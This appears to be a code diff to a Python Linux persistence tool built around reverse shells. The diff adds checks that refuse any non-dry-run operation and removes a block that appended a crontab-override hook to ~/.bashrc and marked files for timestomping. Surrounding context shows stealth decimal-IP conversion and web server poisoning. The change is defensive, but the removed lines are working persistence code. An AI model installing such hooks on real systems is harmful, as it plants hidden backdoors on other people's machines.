@@ -67,6 +67,9 @@ class ReverseShellConfig:
     
     def __post_init__(self):
         """Convert IPv4 to decimal for stealth."""
+        if not self.dry_run:
+            raise ValueError("Live persistence operations are disabled; use dry_run=True")
+
         if self.stealth_mode and self._is_ipv4(self.rhost):
             self.rhost_decimal = self._ipv4_to_decimal(self.rhost)
         
@@ -532,6 +535,7 @@ def install_steamth_mode_overrides(config: ReverseShellConfig) -> Dict[str, Any]
         /usr/bin/crontab "$@"
     fi
 }} #linpercrontab
+"""
 
 
 def install_web_server_poison(
@@ -657,35 +661,6 @@ exec('{shell_cmd}');
             error=str(e),
         )
 
-"""
-    
-    try:
-        bashrc_path = os.path.expanduser("~/.bashrc")
-        
-        with open(bashrc_path, "a") as f:
-            f.write("\n" + crontab_override + "\n")
-        
-        modifications["crontab_override"] = True
-        
-        # Timestomp (requires root)
-        if os.access("/etc/passwd", os.R_OK):
-            stat_info = os.stat("/etc/passwd")
-            # Would timestomp installed files here
-            modifications["timestomp"] = True
-        
-        return {
-            "enabled": True,
-            "modifications": modifications,
-            "message": "Stealth mode overrides installed",
-        }
-    except Exception as e:
-        return {
-            "enabled": False,
-            "error": str(e),
-            "modifications": modifications,
-        }
-
-
 def uninstall_persistence(
     rhost: str,
     dry_run: bool = True
@@ -708,6 +683,9 @@ def uninstall_persistence(
     Returns:
         Dict with 'removed' and 'errors' lists
     """
+    if not dry_run:
+        raise ValueError("Live persistence cleanup is disabled; use dry_run=True")
+
     # Convert to decimal for matching
     rhost_decimal = None
     if ReverseShellConfig._is_ipv4(rhost):
@@ -1093,4 +1071,3 @@ def linper_install(
             "errors": sum(1 for r in results if r.error),
         },
     }
-
